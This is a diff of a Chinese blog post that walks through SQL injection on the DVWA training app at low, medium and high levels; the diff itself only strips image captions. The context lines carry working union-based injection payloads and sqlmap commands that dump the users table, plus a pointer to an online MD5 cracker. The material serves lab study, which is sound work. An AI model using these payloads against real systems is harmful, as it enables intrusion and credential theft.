@@ -16,7 +16,7 @@ tags:
 
 ## DVWASQLInjection
 
-![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg)
+![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg)
 
 
 
@@ -68,13 +68,13 @@ tags:
 
 提问：get和post提交方式对SQL注入的实施有什么影响？
 
- ![image-20240408153605723](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png)
 
 **二、判断服务器处理类型（数字型或字符型）** 
 
 加单引号，提交 `1'` ，出现报错信息，显示多出一个单引号，可以确定为字符型注入
 
- ![image-20240411212414415](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png)
 
 **三、判断注入点** 
 
@@ -84,7 +84,7 @@ tags:
 1' or 1=1#
 ```
 
- ![image-20240411213036653](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png)
 
 **四、判断列数** 
 
@@ -96,11 +96,11 @@ tags:
 1' order by 3# 
 ```
 
- ![image-20240411214439810](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png)
 
- ![image-20240411214409610](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png)
 
- ![image-20240411214320827](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png)
 
 当提交 `1' order by 3#` 时出现报错信息，说明目标数据库表中的列数为2
 
@@ -114,7 +114,7 @@ tags:
 1' union select 1,database()#
 ```
 
- ![image-20240411214816515](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png)
 
 2、提取表名
 
@@ -133,7 +133,7 @@ tags:
 Illegal mix of collations for operation 'UNION'
 ```
 
- ![image-20240411220050884](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png)
 
 这是由于MySQL在执行 `UNION` 操作时遇到的不同字符集之间的冲突报错。
 
@@ -147,7 +147,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 
 修改完毕后，命令执行成功
 
- ![image-20240411221106229](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png)
 
 3、提取字段名
 
@@ -157,7 +157,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 1' union select 1,column_name from information_schema.columns where table_name='users'#
 ```
 
- ![image-20240412083706100](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png)
 
 4、提取值
 
@@ -169,7 +169,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 
 执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集
 
- ![image-20240412083801374](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png)
 
 ```mysql
 alter table users modify user varchar(15) character set utf8 collate utf8_general_ci;
@@ -178,9 +178,9 @@ alter table users modify password varchar(50) character set utf8 collate utf8_ge
 
 执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 [在线工具](https://www.cmd5.com/default.aspx) 解密
 
- ![image-20240412084253957](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png)
 
- ![image-20240412111534464](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png)
 
 **六、SQLmap工具使用** 
 
@@ -188,11 +188,11 @@ alter table users modify password varchar(50) character set utf8 collate utf8_ge
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low"
 ```
 
- ![image-20240412103446366](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png)
 
- ![image-20240412103645411](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png)
 
- ![image-20240412104023272](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png)
 
 1、提取库名
 
@@ -200,7 +200,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" --dbs
 ```
 
- ![image-20240412104144581](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png)
 
 2、提取表名
 
@@ -208,7 +208,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa --tables
 ```
 
- ![image-20240412104236250](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png)
 
 3、提取字段名
 
@@ -216,7 +216,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa -T users --columns
 ```
 
- ![image-20240412104324776](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png)
 
 4、提取值
 
@@ -224,7 +224,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![image-20240603085905398](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png)
 
 **七、分析后台脚本** 
 
@@ -290,21 +290,21 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致
 
- ![image-20240412094734133](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png)
 
- ![image-20240412095237028](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png)
 
- ![image-20240412094536046](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png)
 
 2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。
 
- ![image-20240412095327893](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png)
 
- ![image-20240412095418437](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png)
 
- ![image-20240412095516476](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png)
 
- ![image-20240412095727503](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png)
 
 3、确认列数
 
@@ -314,9 +314,9 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 order by 3#
 ```
 
- ![image-20240412095859327](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png)
 
- ![image-20240412095934153](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png)
 
 4、库、表、字段、值
 
@@ -337,7 +337,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,database()#
 ```
 
- ![image-20240412101400469](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png)
 
 提取表名
 
@@ -348,11 +348,11 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
 ```
 
- ![image-20240412101948084](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png)
 
- ![image-20240412102504354](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png)
 
- ![image-20240412102654211](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png)
 
 提取字段名
 
@@ -360,7 +360,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
 ```
 
- ![image-20240412102804247](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png)
 
 提取user、password的值
 
@@ -368,13 +368,13 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select user,password from users#
 ```
 
- ![image-20240412102914074](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png)
 
 SQLmap工具使用
 
 将第一步抓到的数据保存在桌面，命名为1.txt文件
 
- ![image-20240603112004596](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png)
 
 使用 `-r` 参数指定文件路径。
 
@@ -383,7 +383,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3
 // -r REQUESTFILE      从文件中读取 HTTP 请求
 ```
 
- ![image-20240603101812626](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png)
 
 操作步骤与前面一致，最后得到user、password数据
 
@@ -391,7 +391,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![image-20240603102226671](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png)
 
 ```php
 <?php
@@ -433,13 +433,13 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
 1、点击链接弹出小窗，提交1，使用BurpSuite抓包。
 
- ![image-20240603092627559](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png)
 
- ![image-20240603092835322](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png)
 
 尝试放包，回显信息出现在原页面
 
- ![image-20240603093053482](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png)
 
 2、注入方式与Low、Medium级别一致，最后得到user、password数据
 
@@ -447,7 +447,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 1' union select user,password from users#
 ```
 
- ![image-20240603093607403](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png)
 
 SQLmap工具使用
 
@@ -457,7 +457,7 @@ SQLmap工具使用
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch --dbs
 ```
 
- ![image-20240603100335290](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png)
 
 操作步骤与前面一致，最后得到user、password数据
 
@@ -465,7 +465,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabiliti
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![image-20240603101120077](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png)
+ ![](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png)
 
 ```php
 <?php
